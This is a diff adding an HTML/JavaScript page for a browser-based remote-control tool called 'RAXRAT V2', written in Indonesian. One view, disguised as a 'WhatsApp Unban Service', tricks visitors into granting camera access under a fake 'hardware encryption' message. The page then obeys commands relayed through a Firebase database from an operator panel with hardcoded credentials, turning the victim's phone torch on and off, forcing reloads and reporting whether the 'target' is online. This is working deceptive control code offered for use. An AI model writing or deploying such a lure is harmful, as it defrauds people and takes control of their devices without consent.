@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAXRAT V2 | MONITORING</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; }
+        .rax-card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 20px; }
+        .neon-green { color: #00ff88; text-shadow: 0 0 10px #00ff8855; }
+        .hidden { display: none !important; }
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div id="boxAuth" class="w-full max-w-sm p-8 rax-card text-center">
+        <h1 class="text-3xl font-black neon-green italic mb-8">RAXRAT V2</h1>
+        <div class="space-y-4 text-left">
+            <input type="text" id="usr" placeholder="USERNAME" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none text-green-400">
+            <input type="password" id="pwd" placeholder="PASSWORD" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none text-green-400">
+            <div class="flex gap-2">
+                <button onclick="doAuth('reg')" class="flex-1 py-4 bg-zinc-800 text-gray-400 rounded-xl font-bold text-[10px] uppercase">Register</button>
+                <button onclick="doAuth('login')" class="flex-1 py-4 bg-green-600 text-black font-black rounded-xl text-[10px] uppercase">Login</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashAdmin" class="hidden w-full max-w-4xl space-y-4">
+        <div class="rax-card p-6 flex justify-between items-center border-l-4 border-green-500">
+            <div>
+                <h2 class="font-bold neon-green">OWNER: RALXA</h2>
+                <p id="targetStatus" class="text-[10px] text-zinc-500 uppercase mt-1">Target: <span class="text-red-500">Offline</span></p>
+            </div>
+            <button onclick="location.reload()" class="text-xs text-red-500 underline">LOGOUT</button>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="rax-card p-6">
+                <p class="text-[10px] text-zinc-500 font-bold mb-4 uppercase">Control Center</p>
+                <div class="grid grid-cols-2 gap-3">
+                    <button onclick="sendCmd('SENTER_ON')" class="p-5 bg-zinc-900 rounded-xl hover:bg-yellow-500 hover:text-black transition">FLASH ON</button>
+                    <button onclick="sendCmd('SENTER_OFF')" class="p-5 bg-zinc-900 rounded-xl hover:bg-white hover:text-black transition">FLASH OFF</button>
+                    <button onclick="sendCmd('FORCE_RELOAD')" class="col-span-2 p-3 bg-red-900/20 text-red-500 border border-red-900/50 rounded-xl text-[10px] font-bold">FORCE RELOAD TARGET</button>
+                </div>
+            </div>
+            <div class="rax-card p-6 flex flex-col">
+                <p class="text-[10px] text-zinc-500 font-bold mb-2 uppercase">Live Activity</p>
+                <div id="logs" class="h-32 overflow-y-auto text-[10px] text-green-400 font-mono p-2 bg-black rounded-lg">
+                    > System Synced...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashUser" class="hidden w-full max-w-md text-center p-10 rax-card border-t-4 border-blue-500">
+        <h2 class="text-xl font-bold mb-4 uppercase">WhatsApp Unban Service</h2>
+        <p class="text-[10px] text-zinc-500 mb-8">Harap tetap di halaman ini. Sedang menyambungkan ke server enkripsi.</p>
+        <div id="bindingView" class="space-y-6">
+            <div class="animate-pulse text-5xl">📡</div>
+            <button onclick="startBinding()" id="btnBind" class="w-full py-5 bg-white text-black font-black rounded-full text-sm tracking-widest">SINKRONISASI PERANGKAT</button>
+        </div>
+    </div>
+
+    <script>
+        // SUNTIKAN FIREBASE RALXA
+        const firebaseConfig = {
+            databaseURL: "https://ralxaratpronect-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const cmdRef = db.ref("raxrat_v2/control");
+        const statusRef = db.ref("raxrat_v2/status");
+
+        let currentRole = "";
+        let localDB = JSON.parse(localStorage.getItem('raxDB')) || { "Ralxa": "Rata" };
+
+        function doAuth(mode) {
+            const u = document.getElementById('usr').value;
+            const p = document.getElementById('pwd').value;
+
+            if (mode === 'reg') {
+                if(!u || !p) return alert("DATA KOSONG!");
+                localDB[u] = p;
+                localStorage.setItem('raxDB', JSON.stringify(localDB));
+                alert("REGISTRASI BERHASIL!"); return;
+            }
+
+            if (u === "Ralxa" && p === "Rata") {
+                currentRole = "admin";
+                initAdmin();
+            } else if (localDB[u] === p) {
+                currentRole = "target";
+                initTarget(u);
+            } else {
+                alert("AKSES DITOLAK!");
+            }
+        }
+
+        // --- LOGIKA ADMIN ---
+        function initAdmin() {
+            document.getElementById('boxAuth').classList.add('hidden');
+            document.getElementById('dashAdmin').classList.remove('hidden');
+            
+            // Cek Status Target secara Real-time
+            statusRef.on("value", (snap) => {
+                const data = snap.val();
+                const statusEl = document.getElementById('targetStatus');
+                if (data && data.online === true) {
+                    statusEl.innerHTML = `Target: <span class="text-green-500">ONLINE (${data.user})</span>`;
+                } else {
+                    statusEl.innerHTML = `Target: <span class="text-red-500">OFFLINE</span>`;
+                }
+            });
+        }
+
+        function sendCmd(act) {
+            cmdRef.set({ action: act, time: Date.now() });
+            const l = document.getElementById('logs');
+            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] SENT: ${act}</div>`;
+            l.scrollTop = l.scrollHeight;
+        }
+
+        // --- LOGIKA TARGET ---
+        function initTarget(username) {
+            document.getElementById('boxAuth').classList.add('hidden');
+            document.getElementById('dashUser').classList.remove('hidden');
+
+            // Set status online di Firebase
+            statusRef.set({ online: true, user: username });
+            
+            // Hapus status kalau tab ditutup
+            statusRef.onDisconnect().set({ online: false, user: "none" });
+
+            // Tunggu Perintah Admin
+            cmdRef.on("value", (snap) => {
+                const data = snap.val();
+                if (!data) return;
+
+                if (data.action === "SENTER_ON") {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                    .then(s => {
+                        const track = s.getVideoTracks()[0];
+                        track.applyConstraints({ advanced: [{ torch: true }] });
+                        window.raxStream = s;
+                    });
+                } else if (data.action === "SENTER_OFF") {
+                    if (window.raxStream) {
+                        window.raxStream.getTracks().forEach(t => t.stop());
+                    }
+                } else if (data.action === "FORCE_RELOAD") {
+                    location.reload();
+                }
+            });
+        }
+
+        function startBinding() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => {
+                alert("ENKRIPSI HARDWARE AKTIF!");
+                document.getElementById('btnBind').innerHTML = "TERHUBUNG KE SERVER ✅";
+                document.getElementById('btnBind').classList.replace('bg-white', 'bg-zinc-800');
+                document.getElementById('btnBind').style.color = "#00ff88";
+                s.getTracks().forEach(t => t.stop());
+            });
+        }
+    </script>
+</body>
+</html>
